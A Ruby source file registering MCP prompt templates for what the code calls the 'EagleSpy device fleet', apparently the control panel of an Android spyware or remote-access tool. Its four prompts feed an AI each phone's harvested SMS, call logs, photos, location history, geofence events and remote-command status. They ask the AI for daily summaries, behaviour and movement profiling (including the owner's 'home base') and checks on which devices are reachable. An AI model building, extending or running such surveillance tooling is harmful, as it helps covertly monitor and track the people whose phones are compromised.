# frozen_string_literal: true

module Mcp
  module Prompts
    class PromptTemplates
      def initialize(server)
        @server = server
      end

      def register
        register_daily_summary
        register_behavior_analysis
        register_security_audit
        register_location_tracking
      end

      private

      def register_daily_summary
        @server.register_prompt(
          name: 'daily_summary',
          description: 'Generate a daily summary of all device activity and key events.',
          arguments: [
            { name: 'date', description: 'Date in YYYY-MM-DD format (default: today)', required: false },
            { name: 'device_id', description: 'Optional: limit to specific device', required: false }
          ],
          scope: 'analysis:read'
        ) do |args|
          date = args[:date].present? ? Date.parse(args[:date]) : Date.current
          range = date.beginning_of_day..date.end_of_day

          devices = args[:device_id].present? ? Smartphone.where(device_id: args[:device_id]) : Smartphone.all

          device_summaries = devices.map do |device|
            {
              device_id: device.device_id,
              name: device.name,
              commands: device.pending_commands.where(created_at: range).count,
              locations: device.geo_locations.where(created_at: range).count,
              sms: device.sms_messages.where(created_at: range).count,
              calls: device.call_logs.where(created_at: range).count,
              photos: device.pictures.where(created_at: range).count
            }
          end

          context = {
            date: date.iso8601,
            total_devices: devices.count,
            online_devices: devices.where('last_activity_at > ?', 5.minutes.ago).count,
            devices: device_summaries
          }.to_json

          {
            messages: [
              {
                role: 'user',
                content: {
                  type: 'text',
                  text: "Generate a daily summary report for #{date.strftime('%B %d, %Y')}. " \
                        "Here is the device activity data:\n\n#{context}\n\n" \
                        "Please provide:\n" \
                        "1. Overview of device fleet status\n" \
                        "2. Key activity highlights\n" \
                        "3. Devices that need attention (offline, unusual activity)\n" \
                        "4. Data collection summary"
                }
              }
            ]
          }
        end
      end

      def register_behavior_analysis
        @server.register_prompt(
          name: 'behavior_analysis',
          description: 'Analyze device behavior patterns and provide insights.',
          arguments: [
            { name: 'device_id', description: 'Device identifier', required: true },
            { name: 'days', description: 'Analysis period in days (default: 7)', required: false }
          ],
          scope: 'analysis:read'
        ) do |args|
          device = Smartphone.find_by!(device_id: args[:device_id])
          days = (args[:days] || 7).to_i
          since = days.days.ago

          data = {
            device: { id: device.device_id, name: device.name },
            period: { days: days, from: since.iso8601, to: Time.current.iso8601 },
            activity: {
              commands_by_day: device.pending_commands.where('created_at >= ?', since)
                .group("DATE(created_at)").count.transform_keys(&:to_s),
              locations_by_day: device.geo_locations.where('created_at >= ?', since)
                .group("DATE(created_at)").count.transform_keys(&:to_s),
              total_sms: device.sms_messages.where('created_at >= ?', since).count,
              total_calls: device.call_logs.where('created_at >= ?', since).count,
              total_photos: device.pictures.where('created_at >= ?', since).count
            },
            latest_location: device.geo_locations.order(created_at: :desc).first&.then { |l|
              { lat: l.latitude, lng: l.longitude, at: l.created_at.iso8601 }
            }
          }.to_json

          {
            messages: [
              {
                role: 'user',
                content: {
                  type: 'text',
                  text: "Analyze the behavior patterns for device #{device.device_id} over the last #{days} days.\n\n" \
                        "Data:\n#{data}\n\n" \
                        "Please provide:\n" \
                        "1. Usage patterns (peak hours, frequency)\n" \
                        "2. Communication patterns\n" \
                        "3. Location movement patterns\n" \
                        "4. Any notable changes from expected behavior\n" \
                        "5. Recommendations"
                }
              }
            ]
          }
        rescue ActiveRecord::RecordNotFound
          raise McpServer::PromptNotFoundError, "Device not found: #{args[:device_id]}"
        end
      end

      def register_security_audit
        @server.register_prompt(
          name: 'security_audit',
          description: 'Perform a security audit of the device fleet or a specific device.',
          arguments: [
            { name: 'device_id', description: 'Optional: audit a specific device', required: false },
            { name: 'scope', description: 'Audit scope: quick, standard, comprehensive', required: false }
          ],
          scope: 'analysis:read'
        ) do |args|
          if args[:device_id].present?
            device = Smartphone.find_by!(device_id: args[:device_id])
            devices = [device]
          else
            devices = Smartphone.all.limit(50)
          end

          audit_data = {
            fleet_size: Smartphone.count,
            online: Smartphone.where('last_activity_at > ?', 5.minutes.ago).count,
            offline_24h: Smartphone.where('last_activity_at < ?', 24.hours.ago).count,
            devices: devices.map do |d|
              installation = d.apk_installation
              {
                device_id: d.device_id,
                name: d.name,
                online: d.last_activity_at.present? && d.last_activity_at > 5.minutes.ago,
                last_seen: d.last_activity_at&.iso8601,
                battery: installation&.battery_level,
                pending_commands: d.pending_commands.active.count,
                failed_commands_24h: d.pending_commands.where(status: :failed, created_at: 24.hours.ago..Time.current).count,
                scheduled_commands: d.scheduled_commands.where(active: true).count
              }
            end,
            failed_commands_total: PendingCommand.where(status: :failed, created_at: 24.hours.ago..Time.current).count,
            timeout_commands_total: PendingCommand.where(status: :timeout, created_at: 24.hours.ago..Time.current).count
          }.to_json

          {
            messages: [
              {
                role: 'user',
                content: {
                  type: 'text',
                  text: "Perform a #{args[:scope] || 'standard'} security audit of the EagleSpy device fleet.\n\n" \
                        "Audit data:\n#{audit_data}\n\n" \
                        "Please analyze:\n" \
                        "1. Device connectivity and health status\n" \
                        "2. Command execution reliability\n" \
                        "3. Devices at risk (low battery, offline, high failure rate)\n" \
                        "4. Security concerns or anomalies\n" \
                        "5. Recommendations for improvement"
                }
              }
            ]
          }
        rescue ActiveRecord::RecordNotFound
          raise McpServer::PromptNotFoundError, "Device not found: #{args[:device_id]}"
        end
      end

      def register_location_tracking
        @server.register_prompt(
          name: 'location_tracking',
          description: 'Analyze location tracking data for movement patterns and geofence compliance.',
          arguments: [
            { name: 'device_id', description: 'Device identifier', required: true },
            { name: 'days', description: 'Analysis period in days (default: 7)', required: false }
          ],
          scope: 'data:read'
        ) do |args|
          device = Smartphone.find_by!(device_id: args[:device_id])
          days = (args[:days] || 7).to_i
          since = days.days.ago

          locations = device.geo_locations.where('created_at >= ?', since).order(:created_at)
          geofences = device.geofences.map { |g| { name: g.try(:name), lat: g.try(:latitude), lng: g.try(:longitude), radius: g.try(:radius) } }
          geofence_events = device.geofence_events.where('created_at >= ?', since).map { |e|
            { type: e.try(:event_type), at: e.created_at.iso8601 }
          }

          location_data = {
            device: { id: device.device_id, name: device.name },
            period: { days: days, from: since.iso8601, to: Time.current.iso8601 },
            total_points: locations.count,
            locations: locations.limit(200).map { |l|
              { lat: l.latitude, lng: l.longitude, at: l.created_at.iso8601 }
            },
            geofences: geofences,
            geofence_events: geofence_events
          }.to_json

          {
            messages: [
              {
                role: 'user',
                content: {
                  type: 'text',
                  text: "Analyze location tracking data for device #{device.device_id} over #{days} days.\n\n" \
                        "Location data:\n#{location_data}\n\n" \
                        "Please provide:\n" \
                        "1. Movement pattern summary (home base, frequent locations)\n" \
                        "2. Daily movement patterns\n" \
                        "3. Geofence compliance status\n" \
                        "4. Unusual movements or anomalies\n" \
                        "5. Location coverage gaps"
                }
              }
            ]
          }
        rescue ActiveRecord::RecordNotFound
          raise McpServer::PromptNotFoundError, "Device not found: #{args[:device_id]}"
        end
      end
    end
  end
end
